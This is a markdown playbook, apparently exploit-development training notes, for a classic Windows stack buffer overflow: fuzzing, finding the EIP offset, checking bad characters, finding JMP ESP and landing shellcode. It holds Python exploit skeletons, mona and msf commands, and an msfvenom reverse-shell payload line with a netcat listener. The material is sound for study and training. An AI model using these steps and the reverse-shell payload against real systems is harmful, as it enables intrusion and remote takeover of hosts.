# Playbook: Classic Stack Buffer Overflow

**Signature:** After the crash, `r` shows `eip=41414141` (or your cyclic bytes).
You directly control the saved return address.

## The 8 steps, concretely

### 1. Fuzz / confirm the crash
Send growing buffers until the app dies. Note the length that crashed it.
```python
buf = b"A" * 3000       # bump 500 at a time until crash
```
Attach WinDbg to the target *before* sending. `g` to let it run. Crash → break in.

### 2. Find the offset to EIP
```
# Kali:
msf-pattern_create -l 3000            # paste into your exploit as the buffer
# After crash, read EIP value, then:
msf-pattern_offset -l 3000 -q 42306142   # the value in EIP
```
Or all-in-one in WinDbg:
```
!py mona findmsp -m <cyclic length>   ; reports "EIP contains normal pattern ... offset XXXX"
```

### 3. Control EIP — verify
Set exact offset, put `BBBB` in EIP, `CCCC` after:
```python
offset = 2003                          # example
buf  = b"A"*offset
buf += b"BBBB"                          # -> EIP should be 42424242
buf += b"C"*(3000-len(buf))
```
Confirm `eip=42424242`. Now you own execution. Note where ESP points (`r esp`, then
`dd esp`) — usually right after EIP = your shellcode landing zone.

### 4. Find bad characters
Send `\x01` through `\xff` (skip `\x00` — almost always bad) right after EIP.
Then compare memory to a clean reference:
```
!py mona bytearray -b "\x00"           ; generates bytearray.bin + the array string
; put the array in your buffer, crash, then:
!py mona compare -f C:\mona\bytearray.bin -a <address_of_your_buffer>
```
mona prints exactly which bytes got mangled. Remove them, regenerate, repeat until
"unmodified". **Common bad chars:** `\x00` (null), `\x0a` (LF), `\x0d` (CR),
`\x20` (space) — but *always verify*, never assume.

### 5. Find a jump (JMP ESP)
You need an address holding `JMP ESP` (opcode `FF E4`) with **no bad chars**, in a
**non-ASLR** module:
```
!py mona jmp -r esp -cpb "\x00\x0a\x0d"    ; -cpb = exclude these bad chars
```
Pick an address. Remember: it goes into your buffer **little-endian** (reverse the bytes).

### 6 & 7. Space + mitigations
- DEP off? → shellcode on the stack executes directly. Continue.
- DEP on?  → `dep-rop-playbook.md` first.
- Small space after ESP? → `egghunter-playbook.md`.
- If you land mid-buffer, add a few `\x90` (NOP) as a landing pad before shellcode.

### 8. Land shellcode
```python
import struct
offset  = 2003
jmp_esp = struct.pack("<I", 0x625011af)   # your JMP ESP, little-endian
nops    = b"\x90" * 16
# msfvenom -p windows/shell_reverse_tcp LHOST=x LPORT=y -f python -b "\x00\x0a\x0d"
shellcode = b"..."                        # from msfvenom, badchars excluded
buf = b"A"*offset + jmp_esp + nops + shellcode
buf += b"C"*(3000-len(buf))               # pad to original crash length
```
Start a listener (`nc -lvnp <port>` or `msfconsole` multi/handler), fire, catch shell.

## Gotchas that waste hours
- **Encoder overhead:** encoded shellcode (`shikata_ga_nai`) needs stack space to
  decode itself — it writes below ESP. Add `sub esp, 0x...` or extra NOPs, or the
  decoder corrupts its own code. mona's `stackpivot` / manual `sub esp` fixes it.
- **Off-by-a-little:** if EIP is *close* but not clean 42424242, your offset is off.
- **Wrong module for JMP:** you picked an ASLR/rebased module. Re-check `mona mod`.
- **Buffer length drift:** always pad back to the exact length that caused the crash.

→ Template: `02-templates/stack_bof.py`
